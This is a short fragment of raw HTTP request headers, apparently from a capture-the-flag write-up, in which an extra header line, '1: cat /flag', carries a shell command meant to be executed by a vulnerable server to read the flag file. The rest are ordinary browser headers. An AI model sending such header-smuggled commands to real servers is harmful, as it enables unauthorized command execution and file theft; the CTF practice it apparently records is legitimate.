User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
1: cat /flag
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```
